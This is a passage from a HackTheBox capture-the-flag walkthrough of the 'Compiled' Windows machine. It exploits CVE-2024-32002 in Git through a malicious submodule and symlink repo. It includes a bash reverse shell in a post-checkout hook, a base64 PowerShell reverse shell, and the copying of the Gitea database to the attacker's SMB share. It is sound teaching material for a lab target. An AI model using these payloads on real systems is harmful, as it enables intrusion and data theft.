---
title: HTB: Compiled
url: https://0xdf.gitlab.io/2024/12/14/htb-compiled.html
date: 2024-12-14T14:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: ctf, hackthebox, htb-compiled, nmap, cpp, csharp, git, gitea, flask, python, cve-2024-32002, git-hooks, git-submodule, mingw64, gitea-hash, hashcat, eveil-winrm, cve-2024-20656, visual-studio, msfvenom, runascs
---

![Compiled](/img/compiled-cover.png)

Compiled starts with a website designed to compile Git projects from remote repos. I’ll abuse a CVE in this version of Git to get RCE and a shell. To pivot to the next user, I’ll find the Gitea SQLite database and extract the user hashes. I’ll format that hash into something Hashcat can crack, and recover the password, which is also used by the user on the system. To get system, I’ll abuse a CVE in Visual Studio.

## Box Info

| Name | [Compiled](https://hackthebox.com/machines/compiled)  [Compiled](https://hackthebox.com/machines/compiled) [Play on HackTheBox](https://hackthebox.com/machines/compiled) |
| --- | --- |
| Release Date | 27 Jul 2024 |
| Retire Date | 14 Dec 2024 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Compiled |
| Radar Graph | Radar chart for Compiled |
| First Blood User | 01:30:52[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 01:33:23[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creators | [ruycr4ft ruycr4ft](https://app.hackthebox.com/users/1253217)  [YukaFake YukaFake](https://app.hackthebox.com/users/1361621) |

## Recon

### nmap

`nmap` finds four open TCP ports, HTTP (3000, 5000), WinRM (5985), and 7680:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.26
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-29 15:53 EDT
Nmap scan report for 10.10.11.26
Host is up (0.085s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
3000/tcp open  ppp
5000/tcp open  upnp
5985/tcp open  wsman
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
oxdf@hacky$ nmap -p 3000,5000,5985,7680 -sCV 10.10.11.26
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-29 15:55 EDT
Nmap scan report for 10.10.11.26
Host is up (0.085s latency).

PORT     STATE SERVICE    VERSION
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=a7803540bff379ee; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=YZLiSa2q7hCaM-q5TbadGOVJHf46MTcyMjI4MjkxOTU4MTI2MjkwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 29 Jul 2024 19:55:19 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-arc-green">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Git</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=9844de16afe4322a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=i0_1vyCxGspaHLH4Ya5EY7hbGqA6MTcyMjI4MjkyNTAzMzY3MzkwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 29 Jul 2024 19:55:25 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Mon, 29 Jul 2024 19:55:19 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5234
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Compiled - Code Compiling Services</title>
|     <!-- Bootstrap CSS -->
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
|     <!-- Custom CSS -->
|     <style>
|     your custom CSS here */
|     body {
|     font-family: 'Ubuntu Mono', monospace;
|     background-color: #272822;
|     color: #ddd;
|     .jumbotron {
|     background-color: #1e1e1e;
|     color: #fff;
|     padding: 100px 20px;
|     margin-bottom: 0;
|     .services {
|   RTSPRequest:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp open  pando-pub?
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.80%I=7%D=7/29%Time=66A7F3A7%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:a7803540bff379ee;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=YZLiSa2q7hCaM-q5TbadGOVJHf46MTcyMjI4MjkxOTU4MTI2MjkwMA;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2029\x20Jul\x202024\x2019:55:19\x20G
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-
SF:arc-green\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=d
SF:evice-width,\x20initial-scale=1\">\n\t<title>Git</title>\n\t<link\x20re
SF:l=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR2l0I
SF:iwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxl
SF:ZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh
SF:0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZX
SF:MiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA")
SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowe
SF:d\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0,\x2
SF:0private,\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_like_
SF:gitea=9844de16afe4322a;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-
SF:Cookie:\x20_csrf=i0_1vyCxGspaHLH4Ya5EY7hbGqA6MTcyMjI4MjkyNTAzMzY3MzkwMA
SF:;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-
SF:Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2029\x20Jul\x202024\x2019:55:2
SF:5\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.80%I=7%D=7/29%Time=66A7F3A7%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1521,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\x2
SF:0Python/3\.12\.3\r\nDate:\x20Mon,\x2029\x20Jul\x202024\x2019:55:19\x20G
SF:MT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
SF:205234\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
SF:=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20
SF:\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20
SF:initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Compiled\x20-\x20Code\x20
SF:Compiling\x20Services</title>\n\x20\x20\x20\x20<!--\x20Bootstrap\x20CSS
SF:\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"https://
SF:stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min\.css\
SF:">\n\x20\x20\x20\x20<!--\x20Custom\x20CSS\x20-->\n\x20\x20\x20\x20<styl
SF:e>\n\x20\x20\x20\x20\x20\x20\x20\x20/\*\x20Add\x20your\x20custom\x20CSS
SF:\x20here\x20\*/\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20'Ubuntu\x20Mono',\
SF:x20monospace;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20backgrou
SF:nd-color:\x20#272822;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:color:\x20#ddd;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\.jumbotron\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20background-color:\x20#1e1e1e;\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20padding:\x20100px\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20margin-bottom:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20}\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\.services\x20{\n\x20")%r(RTSPRequest,
SF:16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x
SF:20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>
SF:Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20cod
SF:e:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20re
SF:quest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20s
SF:yntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</
SF:html>\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.21 seconds

```

It’s a Windows box without the normal Windows ports, other than WinRM on 5985. TCP 5000 shows a Python webserver.

### Website - TCP 5000

#### Site

The site offers online compilation for C++, C#, and .NET:

![image-20240729163256925](/img/image-20240729163256925.png)

There’s no links on the page to any other pages. The form at the bottom takes a Git repo URL. If I get it a random string, it errors, saying it must start with `http://` and end with `.git`:

![image-20240729163453095](/img/image-20240729163453095.png)

If I give it `http://10.10.14.6/testgit.git`, it reports success:

![image-20240729163528021](/img/image-20240729163528021.png)

Shortly after it tries to get that repo:

```

oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.26 - - [29/Jul/2024 16:35:06] code 404, message File not found
10.10.11.26 - - [29/Jul/2024 16:35:06] "GET /testgit.git/info/refs?service=git-upload-pack HTTP/1.1" 404 -

```

If I catch that connection with `nc`, I’ll see the User Agent string for the site in the request, giving the version of Git running on the target:

```

GET /testgit.git/info/refs?service=git-upload-pack HTTP/1.1
Host: 10.10.14.6
User-Agent: git/2.45.0.windows.1
Accept: */*
Accept-Encoding: deflate, gzip, br, zstd
Pragma: no-cache
Git-Protocol: version=2

```

I could stand up my own Git server, but I’ll check out the rest of the box first.

#### Tech Stack

The HTTP response headers show that this is a Python webserver, likely Flask:

```

HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Mon, 29 Jul 2024 20:10:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 5234
Connection: close

```

The 404 page is the default Flask 404:

![image-20240729163951471](/img/image-20240729163951471.png)

I’ll skip the directory brute force because I’ll find the source elsewhere.

### Gitea - TCP 3000

#### Site

TCP 3000 is hosting an instance of Gitea:

![image-20240729164120559](/img/image-20240729164120559.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

Without registering, I’m able to see two repos under explore:

![image-20240729164150289](/img/image-20240729164150289.png)

#### Compiled Repo

The “Compiled” repo has the source code for a Flask application:

![image-20240729164225871](/img/image-20240729164225871.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

It’s the website on 5000. There’s a note at the bottom about making sure that Visual Studio is updated to the latest version. That’s a clue for later.

The source is very short:

```

from flask import Flask, request, render_template, redirect, url_for
import os

app = Flask(__name__)

# Configuration
REPO_FILE_PATH = r'C:\Users\Richard\source\repos\repos.txt'

@app.route('/', methods=['GET', 'POST'])
def index():
    error = None
    success = None
    if request.method == 'POST':
        repo_url = request.form['repo_url']
        if # Add a sanitization to check for valid Git repository URLs.
            with open(REPO_FILE_PATH, 'a') as f:
                f.write(repo_url + '\n')
            success = 'Your git repository is being cloned for compilation.'
        else:
            error = 'Invalid Git repository URL. It must start with "http://" and end with ".git".'
    return render_template('index.html', error=error, success=success)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

```

#### Calculator Repo

The Calculator repo is a C++ project that runs a simple command line calculator application:

![image-20240729164428176](/img/image-20240729164428176.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There is a username leak of Richard here in the installation instructions:

![image-20240729164946924](/img/image-20240729164946924.png)

That may also be leaking the version of `git` installed.

I can pass the URL for this repo (`http://10.10.11.26:3000/richard/Calculator.git`) to the other website, but nothing interesting happens.

#### Registration

I am able to register an account using the registration link at the top right of the page:

![image-20240729164700289](/img/image-20240729164700289.png)

I can create new repos as well.

![image-20240729164746952](/img/image-20240729164746952.png)

## Shell as Richard

### CVE-2024-32002

#### Identify Vulnerability

Searching for vulnerabilities in this version of Windows returns a bunch of information about CVE-2024-32002:

![image-20240729165335010](/img/image-20240729165335010.png)

#### Background

The vulnerability is [described as](https://nvd.nist.gov/vuln/detail/CVE-2024-32002):

> Prior to versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4, repositories with submodules can be crafted in a way that exploits a bug in Git whereby it can be fooled into writing files not into the submodule’s worktree but into a `.git/` directory. This allows writing a hook that will be executed while the clone operation is still running, giving the user no opportunity to inspect the code that is being executed.

[This post](https://amalmurali.me/posts/git-rce/) does a really nice job explaining how the vulnerability works. There’s a script at the end that shows how to get it set up. The issue is in how `git` follows symlinks to write back to the main repo’s `.git` directory. If it can write into the `hooks/post-checkout` script, then it will get execution once it runs.

One interesting thing to note about the writeup is that it is taking place on a Windows machine but within a GitBash console that effectively gives a Linux-like environment. I don’t know that that is the case on Compiled, and I will keep in mind that I may have to adjust my scripts.

### RCE

#### hook Repo

I’m going to need two repos. In the post they call them `hook` and `captain`, so I’ll use the same here. I’ll create a repo named `hook` in Gitea (making sure it’s not private, or the site won’t be able to clone it later). Then I’ll clone it to my host:

```

oxdf@hacky$ git clone http://10.10.11.26:3000/0xdf/hook.git
Cloning into 'hook'...
warning: You appear to have cloned an empty repository.    
oxdf@hacky$ cd hook/ 

```

Following along with the script, I’ll create a `y/hooks` directory, and create a `post-checkout` script in it:

```

oxdf@hacky$ mkdir -p y/hooks
oxdf@hacky$ vim y/hooks/post-checkout
oxdf@hacky$ chmod +x y/hooks/post-checkout
oxdf@hacky$ cat y/hooks/post-checkout 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

I’m going with a Bash reverse shell here, assuming I’m working in a similar environment as the blog post. If it doesn’t work, I can try PowerShell here.

I’ll commit these changes and push them back to Gitea:

```

oxdf@hacky$ git add y/hooks/post-checkout
oxdf@hacky$ git commit -m "post-checkout"
[main (root-commit) c91fe01] post-checkout          
 1 file changed, 3 insertions(+)
 create mode 100755 y/hooks/post-checkout     
oxdf@hacky$ git push
Username for 'http://10.10.11.26:3000': 0xdf
Password for 'http://0xdf@10.10.11.26:3000':
Enumerating objects: 5, done.                             
Counting objects: 100% (5/5), done.
Delta compression using up to 8 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (5/5), 342 bytes | 342.00 KiB/s, done.
Total 5 (delta 0), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.11.26:3000/0xdf/hook.git                   
 * [new branch]      main -> main

```

#### captain Repo

I’ll create a second repo named `captain` (again not private) and clone it to my host:

```

oxdf@hacky$ cd ..
oxdf@hacky$ git clone http://10.10.11.26:3000/0xdf/captain.git
Cloning into 'captain'...               
warning: You appear to have cloned an empty repository.
oxdf@hacky$ cd captain/

```

Now I add the `hook` repo as a submodule:

```

oxdf@hacky$ git submodule add --name x/y http://10.10.11.26:3000/0xdf/hook.git A/modules/x
Cloning into '/home/oxdf/compiled/captain/A/modules/x'...
remote: Enumerating objects: 5, done.  
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (5/5), done.
oxdf@hacky$ git commit -m "add-submodule"
[main (root-commit) 01f75cb] add-submodule 
 2 files changed, 4 insertions(+)
 create mode 100644 .gitmodules            
 create mode 160000 A/modules/x  

```

In the script, it references a local repo, but then later edits it to be a remote repo. I’ll go directly to the remote reference.

Now I’ll create the symlink:

```

oxdf@hacky$ printf ".git" > dotgit.txt
oxdf@hacky$ git hash-object -w --stdin < dotgit.txt > dot-git.hash
oxdf@hacky$ printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
oxdf@hacky$ git update-index --index-info < index.info

```

This is the least intuitive part of the exploit to me. It’s not a Linux symlink, but a Git symlink. The main point here is to write the `index.info` file, and then add it to the existing index using `git update-index`. Mode 120000 is the Git file mode for a symlink.

Finally I’ll commit all this and push it back to Gitea:

```

oxdf@hacky$ git commit -m "add-symlink"
[main 9d0ca93] add-symlink
 1 file changed, 1 insertion(+)
 create mode 120000 a
oxdf@hacky$ git push
Username for 'http://10.10.11.26:3000': 0xdf
Password for 'http://0xdf@10.10.11.26:3000': 
Enumerating objects: 8, done.
Counting objects: 100% (8/8), done.
Delta compression using up to 8 threads
Compressing objects: 100% (5/5), done.
Writing objects: 100% (8/8), 605 bytes | 605.00 KiB/s, done.
Total 8 (delta 1), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.11.26:3000/0xdf/captain.git
 * [new branch]      main -> main

```

#### Shell

I’ll grab the link to the `captain` repo, `http://10.10.11.26:3000/0xdf/captain.git`, and submit it to the service on port 5000.

Less than a minute later I’ve got a shell running in a GitBash environment:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.26 58152

Richard@COMPILED MINGW64 ~/source/cloned_repos/60eqf/.git/modules/x ((beaf328...))
$ 

```

#### PowerShell

I don’t love this GitBash shell, so I’ll switch over to PowerShell (though all the next steps work from either). I’ll generate a base64-encoded PowerShell reverse shell from [revshells.com](https://www.revshells.com/) and run it from the shell:

```

Richard@COMPILED MINGW64 ~/source/cloned_repos/60eqf/.git/modules/x ((beaf328...))
$  powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

```

It hangs, but at another `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.26 58162

PS C:\Users\Richard\source\cloned_repos\60eqf\.git\modules\x>

```

## Shell as emily

### Enumeration

#### Richard’s Home Directory

In Richard’s home directory, there’s a few objects of note:

```

PS C:\Users\Richard> ls

    Directory: C:\Users\Richard

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/25/2024  10:40 PM                .ssh
d-r---         5/23/2024   3:45 PM                3D Objects
d-r---         5/23/2024   3:45 PM                Contacts
d-r---         5/24/2024  10:06 PM                Desktop
d-r---          7/3/2024  12:37 PM                Documents
d-r---         5/23/2024   3:45 PM                Downloads
d-r---         5/23/2024   3:45 PM                Favorites
d-r---         5/23/2024   3:45 PM                Links
d-r---         5/23/2024   3:45 PM                Music
d-r---         5/23/2024   3:47 PM                OneDrive
d-r---         5/23/2024   3:45 PM                Pictures
d-r---         5/23/2024   3:45 PM                Saved Games
d-r---         5/23/2024   3:45 PM                Searches
d-----          7/3/2024  12:27 PM                source
d-r---         5/23/2024   3:45 PM                Videos
----s-          7/4/2024   1:22 PM             32 .bash_history
-a----         5/23/2024   4:12 PM             87 .gitconfig 

```

`.ssh` has an `authorized_keys` file. That could be interesting if I need to SSH. The `.gitconfig` file is what allows the foothold exploit to work, enabling symlinks:

```

[protocol "file"]
        allow = always
[core]
        symlinks = true
[init]
        defaultBranch = main

```

There is a `clone.sh` script in `Documents`:

```

#!/bin/bash

# Define the file containing repository URLs
repos_file="C:/Users/Richard/source/repos/repos.txt"

# Specify the path where you want to clone the repositories
clone_path="C:/Users/Richard/source/cloned_repos"

# Check if the file exists
if [ ! -f "$repos_file" ]; then
    echo "Error: Repositories file $repos_file not found."
    exit 1
fi

# Create the clone path if it doesn't exist
mkdir -p "$clone_path"

# Loop through each repository URL in the file and clone it
while IFS= read -r repo_url; do
    if [[ ! -z "${repo_url}" ]]; then
        repo_name=$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
        echo "Cloning repository: $repo_url"
        git clone --recursive "$repo_url" "$clone_path/$repo_name"
        echo "Repository cloned."
    fi
done < "$repos_file"

echo -n > "$repos_file"
echo "All repositories cloned successfully to $clone_path."

# Cleanup Section
 
# Define the folder path
folderPath="C:/Users/Richard/source/cloned_repos"

# Check if the folder exists
if [ -d "$folderPath" ]; then
  echo "Deleting contents of $folderPath..."

  # Delete all files in the folder
  find "$folderPath" -mindepth 1 -type f -delete

  # Delete all directories and subdirectories in the folder
  find "$folderPath" -mindepth 1 -type d -exec rm -rf {} +

  echo "Contents of $folderPath have been deleted."
else
  echo "Folder $folderPath not found."
fi

```

This also has to do with the foothold, but isn’t useful going forward.

#### Other Users

There are two other users with home directories:

```

PS C:\users> ls

    Directory: C:\users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          7/4/2024  12:53 PM                Administrator
d-----          7/4/2024  12:55 PM                Emily
d-r---         1/20/2024   1:33 AM                Public
d-----          7/4/2024   1:22 PM                Richard

```

Richard is not able to access either, and `Public` is empty.

#### File System Root

The `C:\` directory is very clean:

```

PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/24/2024   4:36 PM                app
d-----         12/7/2019  10:14 AM                PerfLogs
d-r---         5/24/2024   8:10 PM                Program Files
d-r---         1/30/2024   6:16 PM                Program Files (x86)
d-r---         5/22/2024   7:56 PM                Users
d-----         7/16/2024   2:04 PM                Windows

```

The only unusual directory is `app`, which just contains the Python Flask application.

#### Gitea

Gitea has it’s files in `C:\Program Files\Gitea`:

```

PS C:\Program Files\Gitea> ls

    Directory: C:\Program Files\Gitea

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/22/2024   8:01 PM                custom
d-----         7/30/2024   5:37 PM                data
d-----         5/22/2024   8:01 PM                log
-a----         5/22/2024   7:42 PM      208024735 gitea.exe

```

There’s a `gitea.db` file in `data`.

I’ll start an SMB server on my host:

```

oxdf@hacky$ smbserver.py share . -username 0xdf -password 0xdf -smb2support
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

It’s important to give it a username and password or modern Windows won’t connect to it (as well as SMB2 support). I’ll mount the share and copy the file to it:

```

PS C:\Program Files\Gitea> net use \\10.10.14.6\share /u:0xdf 0xdf
The command completed successfully.

PS C:\Program Files\Gitea> copy data\gitea.db //10.10.14.6/share/

```

#### Database Enumeration

The DB is an SQLite file:

```

oxdf@hacky$ file gitea.db 
gitea.db: SQLite 3.x database, last written using SQLite version 3042000, file counter 718, database pages 494, 1st free page 494, free pages 1, cookie 0x1cb, schema 4, UTF-8, version-valid-for 718

```

It’s got a lot of tables:

```

oxdf@hacky$ sqlite3 gitea.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
access                     org_user                 
access_token               package                  
action                     package_blob             
action_artifact            package_blob_upload      
action_run                 package_cleanup_rule     
action_run_index           package_file             
action_run_job             package_property         
action_runner              package_version          
action_runner_token        project                  
action_schedule            project_board            
action_schedule_spec       project_issue            
